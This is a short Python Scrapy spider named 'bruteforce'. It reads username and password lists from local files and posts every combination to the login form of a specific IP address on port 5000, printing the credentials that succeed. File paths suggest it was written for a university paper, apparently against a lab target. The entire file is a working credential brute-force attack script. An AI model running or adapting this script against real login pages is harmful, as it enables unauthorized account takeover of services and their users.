import scrapy
import logging

usernames = []
with open('C:/Users/marvi/Documents/Uni/Hausarbeit/usernames.txt') as f:
    usernames = f.read().splitlines()

passwords = []
with open('C:/Users/marvi/Documents/Uni/Hausarbeit/passwords.txt') as f:
    passwords = f.read().splitlines()

logging.getLogger('scrapy').setLevel(logging.WARNING)

class BruteForceSpider(scrapy.Spider):
    name = 'bruteforce'
    allowed_domains = ['141.87.59.223']
    start_urls = ['http://141.87.59.223:5000/login']

    def parse(self, response):
        for username in usernames:
            for password in passwords:
                #self.log(f"Trying {username} with {password}")
                yield scrapy.FormRequest.from_response(
                    response,
                    formdata={'username': username, 'password': password},
                    meta = {'username': username, 'password': password},
                    callback=self.after_login
                )
    
    def after_login(self, response):
        username = response.meta['username']
        password = response.meta['password']
        if 'login' not in response.url:
            #self.log(f"Login successful for username: {username}, password: {password}")
            print(f"Login successful for username: {username}, password: {password}")
        else:
            None
            #self.log(f"Login failed for username: {username}, password: {password}")

        """
        # Extract all links
        links = response.css('a::attr(href)').extract()
        for link in links:
            yield scrapy.Request(url=link, callback=self.parse)
        # Extract all forms
        forms = response.css('form')
        for form in forms:
            form_data = {}
            for field in form.css('input'):
                name = field.css('::attr(name)').extract_first()
                value = field.css('::attr(value)').extract_first()
                form_data[name] = value
            yield form_data
        """

